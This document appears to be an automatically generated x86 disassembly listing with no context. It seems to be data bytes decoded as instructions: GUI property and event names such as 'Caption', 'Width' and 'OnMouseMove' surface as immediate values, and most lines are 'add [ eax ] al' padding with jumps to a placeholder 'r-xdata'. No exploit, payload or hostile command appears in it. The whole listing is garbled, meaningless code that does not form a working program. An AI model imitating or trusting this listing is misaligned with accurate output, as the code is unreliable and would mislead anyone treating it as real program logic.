sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xfc65646f
aaa
inc ebp
add [ eax ] ch
add al [ eax ]
jmp esp
in al 0x7f
inc ebp
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
[ edx + 0x73c00045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
add [ eax ] dh
add bh bh
in al dx
loop r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax + 0x4573 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
inc ebp
add [ eax + 0x4573 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x76 ] ah
inc ebp
popad
outsb
nop
stosb [ edi ]
inc ecx
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x300ffff ] ah
dec ebx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x4a
outsb
je r-xdata
jae r-xdata
add ah ch
add al [ eax ]
add [ eax ] cl
jecxz r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
inc ebp
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec esp
loope r-xdata
jb r-xdata
cmp [ ebp ] al
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
fadd [ edx + 0x45 ]
add [ eax + 0x3 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
[ eax + 0x10045b4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
push eax
fild [ ebx ]
add [ ecx + 0x43 ] bh
add ah bl
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
inc esp
add ah cl
dec edx
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x5700ffff ] ah
dec edx
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
inc esp
xor eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push 0x9b00438e
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax - 0x25 ] dl
inc ebx
add [ eax ] dh
jbe r-xdata
inc eax
stosb [ edi ]
inc ecx
adc [ eax ] al
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
lea eax [ ebx ]
outsd
outsb
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
mov ah 0x8f
inc ebx
add [ eax + eax ] dh
call [ esi + eax + 0x44 ]
add [ ecx ] al
add [ eax ] al
sub_45406d
add ah bl
add [ ebp ] 0x0
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jb r-xdata
call 0xffffffffad44416e
mov ah 0x45
imul ebp [ edi + 0x6e ] r-xdata
xchg esp eax
fild [ ebx ]
pushad
jbe r-xdata
jb r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
add [ eax ] dh
add bh bh
in al dx
loop r-xdata
add [ eax + 0x4573 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
inc ebp
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec esp
loope r-xdata
jo r-xdata
inc ebp
add [ ecx ] ch
add al [ eax ]
call [ eax ]
add [ ebp ] 0xdc
add [ ebp ] 0x0
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x300ffff ] ah
dec ebx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x4a
outsb
je r-xdata
add ah ch
add al [ eax ]
add [ eax ] cl
jecxz r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
inc ebp
add [ eax + 0x4573 ] cl
add [ eax ] al
add [ eax ] 0x0
jae r-xdata
popad
outsb
nop
stosb [ edi ]
inc ecx
adc [ eax ] al
push eax
fild [ ebx ]
add [ ecx + 0x43 ] bh
add ah bl
add [ ebp ] 0x0
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
jb r-xdata
cmp [ ebp ] al
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
fadd [ edx + 0x45 ]
add [ eax + 0x3 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
[ eax + 0x10045b4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add [ eax + 0x76 ] ah
inc ebp
je r-xdata
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
inc esp
add ah cl
dec edx
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x5700ffff ] ah
dec edx
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
inc esp
xor eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push 0x9b00438e
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax - 0x25 ] dl
inc ebx
add [ eax ] dh
jbe r-xdata
inc eax
stosb [ edi ]
inc ecx
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
xor [ esi + 0x45 ] dh
insb
test [ gs : ebp + 0x16c0043 ] bl
add bh bh
mov [ edx + 0x44 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
lea eax [ ebx ]
outsd
outsb
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
mov ah 0x8f
inc ebx
add [ eax + eax ] dh
call [ esi + eax + 0x44 ]
add [ ecx ] al
add [ eax ] al
sub_4542cb
pushfd
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
inc esp
add [ eax ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x40109474
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
outsb
je r-xdata
dec ecx
imul ebp [ ebp + 0x60 ] 0x8004532
add al [ eax ]
cmp al 0x10
outsd
outsb
je r-xdata
add [ eax ] al
scasd [ edi ]
inc ecx
add [ eax ] ch
add bh bh
inc eax
loop r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
add [ eax + 0x4573 ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
add [ eax - 0x1e ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
add [ eax + 0x4f0e002e ] al
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
mov ecx 0x2400041
add bh bh
rol [ edx - 0x7d1bffbb ] 0x1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
add ah ah
add [ ebp ] 0x0
inc eax
add [ eax + eax ] cl
[ ecx + ebx * 8 ]
insb
cmp al 0x10
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
aaa
inc ebp
add [ edi ] ch
add al [ eax ]
dec [ ebx + eax * 4 ]
inc ebp
add ah bl
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
outsb
add al 0x39
inc ebp
outsb
arpl [ eax + 0x7c ] bp
xlat
inc esp
add [ eax + eax ] bh
inc [ ecx ]
inc ebx
add ah bl
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
add [ eax ] al
dec edi
jb r-xdata
jmp edx
jo r-xdata
add [ 0x35ff0002 ] dh
add al [ eax ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
insb
jae r-xdata
jb r-xdata
inc eax
add [ esi + eax * 4 - 0x7967ffbb ] cl
inc ebp
add ah bl
add [ ebp ] 0x0
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d04002d ] al
outsb
jne r-xdata
iretd
add [ eax ] al
add [ ebx ] dh
add [ eax ] cl
push eax
outsd
cmp [ ebp ] al
xor [ edx ] al
add bh bh
jo r-xdata
insb
inc ebx
jb r-xdata
adc [ eax ] al
xor al 0x2
add bh bh
xor al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
outsb
je r-xdata
add [ eax ] al
[ eax + eax ]
jae r-xdata
inc ebp
add ah bl
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
adc [ eax ] al
cdq
add [ eax ] al
[ edx - 0x1d9bffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080037 ] al
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
or al 0x0
or eax 0x74726556
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ eax - 0x3ffba8a ]
add [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
dec [ eax ]
fld [ ebx ]
cwde
jae r-xdata
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
sub eax [ edx ]
add bh bh
mov [ edi - 0x7d23ffbb ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
add [ eax ] al
cmp [ eax ] eax
pop es
adc [ ecx ] eax
mov [ edx ] al
add bh bh
mov [ edx ] al
add bh bh
fadd [ edx + 0x45 ]
add [ eax - 0x80000000 ] al
cmp al 0x0
or cl [ edi + 0x6e ]
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax ] al
inc eax
add [ eax ] al
je r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax + eax ] 0x5
push edi
xor al [ ebp ]
or al 0x2
add bh bh
call 0xffffffffdc458b24
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
inc ebx
insb
outsd
jae r-xdata
pushfd
xchg ebp eax
inc ebx
add al al
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
add [ eax + 0x2 ] bl
add bh bh
sub al 0x84
inc ebp
add ah bl
add [ ebp ] 0x0
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
fdivr [ ecx ]
inc ebp
add [ eax - 0x6700fffe ] bl
add al [ eax ]
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
dec edi
outsb
inc ebx
enter 0x44cf 0x0
pop eax
add al [ eax ]
[ esp + eax * 4 ]
add [ eax + 0x4f090045 ] al
js r-xdata
fadd [ edx + 0x45 ]
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] cl
dec edi
outsb
inc ebx
jb r-xdata
jb r-xdata
push ecx
mov [ ecx ] dl
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
pop esp
jb r-xdata
add [ eax - 0x5f00fffe ] ah
push eax
outsd
jo r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
mov [ gs : ecx ] dl
or al 0x96
inc ebx
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
jbe r-xdata
jns r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
mov al [ 0xffffffffdcff0002 ]
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
jo r-xdata
dec edi
outsb
inc esp
jb r-xdata
pushad
xchg ebx eax
inc ebx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
mov [ ecx ] dl
outsb
inc esp
jae r-xdata
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
fadd [ edx + 0x45 ]
add [ eax - 0x80000000 ] al
inc ebp
add [ ecx ] cl
dec edi
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
outsd
outsb
je r-xdata
add al [ eax ]
adc [ ecx ] eax
mov al [ 0xffffffffa0ff0002 ]
[ eax - 0x2300fffe ]
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
adc [ ecx ] eax
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add bh bh
fadd [ edx + 0x45 ]
add [ eax - 0x80000000 ] al
dec edi
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0x886f666e
adc [ ecx ] eax
mov al 0x2
add bh bh
mov al 0x2
add bh bh
fadd [ edx + 0x45 ]
add [ eax - 0x80000000 ] al
dec ebp
add [ esi ] al
dec edi
outsb
dec eax
imul esp [ ebp + 0x58 ] 0xa800453a
add al [ eax ]
[ eax + 0x1ff0002 ]
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x10 ] bp
xchg ebp eax
inc ebx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
xchg edx eax
inc ebx
add al ch
add [ eax ] al
add al [ eax ]
push ecx
outsb
outsw
mov [ ecx ] dl
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
jo r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
inc ebx
add [ eax ] cl
add [ eax ] al
add [ esi ] 0xc
dec edi
xchg ebx eax
inc ebx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
arpl [ ebx + 0x4f ] bp
xchg ecx eax
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
loopne r-xdata
jo r-xdata
nop
inc ebx
add al bl
cwde
xchg ecx eax
inc ebx
add al ah
add [ eax ] eax
jmp eax
add bh bh
fadd [ edx + 0x45 ]
add [ eax - 0x80000000 ] al
push esp
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
xchg esi eax
inc ebx
add [ eax ] bh
add [ eax ] eax
nop
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
outsd
jne r-xdata
push ebp
jo r-xdata
adc [ ecx ] eax
enter 0x2 0xff
enter 0x2 0xff
fadd [ edx + 0x45 ]
add [ eax - 0x80000000 ] al
pop ebx
add [ esi ] al
dec edi
outsb
push ebx
push 0x94c4776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
push edi
push 0x556c6565
jo r-xdata
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
inc ebp
add ah ch
jb r-xdata
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebp
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
adc [ ecx ] eax
mov eax 0xb8ff0002
add al [ eax ]
insb
and al 0x97
inc esp
outsd
ja r-xdata
add al 0x1d
add [ eax ] cl
jbe r-xdata
add [ eax + 0x64004454 ] al
jno r-xdata
xor al 0x40
add al bh
pop [ ebp ]
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add ah dh
imul eax [ ebp ] 0xffffff80
push esp
inc esp
add [ ecx + esi * 2 + 0x45 ] ah
inc esp
add [ edi ] al
dec edi
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
inc ebx
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
outsb
dec ebp
outsd
jne r-xdata
push edi
push 0x246c6565
xchg edi eax
jae r-xdata
push edi
push 0x446c6565
outsd
ja r-xdata
add [ eax ] al
call 0xffffffffd8458d52
inc esi
outsd
jb r-xdata
add [ ecx ] cl
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
jl r-xdata
add al ah
loope r-xdata
fcom st3
inc ebx
add ah bl
rol [ ebx ] cl
dec eax
jne r-xdata
add [ eax ] dh
inc eax
inc ecx
add [ eax - 0x4a ] bl
inc ebp
add al dh
insd
inc ebp
add ah bh
outsb
inc ebp
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 + 0x77740041 ] dh
inc ebp
add [ eax + ebx * 4 - 0x4cebffbf ] dl
inc ebp
add ah ch
je r-xdata
jpe r-xdata
sbb al 0x3a
inc ebp
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
and al 0x97
inc ebx
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
outsb
dec ebp
add [ eax ] al
add [ ebp + ecx * 2 + 0x45 ] bh
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
in al 0x4c
inc ebp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
mov al 0xb
mov al 0xc5
add [ eax + 0x70004596 ] ch
pop ebx
inc esp
add al bh
inc ebp
inc esp
add [ ebx + ebp * 4 + 0x61400045 ] bh
inc ebp
add al dh
arpl [ ebp ] ax
pushfd
pushfd
inc ebp
add al bl
insb
inc ebp
add [ ebp + ebp * 2 + 0x45 ] dl
add [ edi + ebp * 4 + 0x6a100045 ] bl
inc ebp
add [ eax - 0x7fffba56 ] ah
xchg ecx eax
inc ebp
add [ esp + ebp * 4 + 0x45 ] dl
add [ eax ] bh
ja r-xdata
inc esp
inc esp
add [ ecx + ecx * 2 + 0x44 ] bh
add [ edi + esi * 2 + 0x4bc0045 ] dh
inc esp
add [ edi + eax * 2 + 0x48580044 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add [ edi + 0x45 ] cl
add [ eax + 0x7e ] bl
inc ebp
add [ eax ] cl
push ds
inc esp
add [ ebx + ecx * 4 ] bl
inc ebp
add [ esi + ecx * 4 + 0x45 ] bh
jl r-xdata
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x3c0043e0 ] ch
ja r-xdata
dec esp
inc ebp
add al bh
add al [ eax ]
add [ edx + edi - 0x6463ffbb ] dh
inc ecx
add al bl
imul eax [ ebp ] r-xdata
in al dx
cwde
dec esp
inc ebp
add al dl
outsd
arpl [ ebx + 0x58 ] bp
xchg esp eax
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl [ ebx + ecx * 2 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
dec esp
popad
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2fffbab4 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x4c
mov [ ecx ] dl
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
add ah ah
xor al 0x40
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
mov ah 0x45
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ esp + esi * 2 + 0x45 ] dl
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ eax + 0x75 ] cl
inc ebp
in al dx
add [ eax ] bh
lea eax [ ebp ]
mov al [ 0xffffffffa400441e ]
push ds
inc esp
add [ edi + ecx * 4 + 0x1d040045 ] dh
inc ebp
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
test al 0xcc
inc ebp
add [ ecx + eax * 2 ] dl
inc ecx
add [ edi + edx * 4 + 0x40300041 ] ah
inc ecx
add [ eax + ebx * 4 + 0x41 ] bh
add [ eax - 0x69 ] cl
inc ecx
add [ eax + ebx * 4 - 0x667bffbf ] cl
inc ecx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ edx + ecx * 8 + 0xe0045 ] bh
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
and al 0x46
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] dl
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
nop
lodsb [ esi ]
dec esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
dec esi
inc ebp
add [ eax ] ch
dec edi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
dec edi
inc ebp
add [ eax + 0x1 ] al
add [ eax ] al
inc eax
and eax [ ecx ]
pushfd
fwait
inc ecx
add ah ah
xor al 0x40
add al dh
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
inc eax
movsb [ edi ] [ esi ]
dec ebx
inc ebp
add [ ebp + edi + 0xe0045 ] dl
add eax 0x6d726f46
jae r-xdata
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
sub [ edi + 0x45 ] cl
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
cmp al 0x10
inc eax
add [ eax ] ch
xchg [ ebp ] al
cmp al 0x86
inc ebp
add [ eax ] al
add [ eax ] al
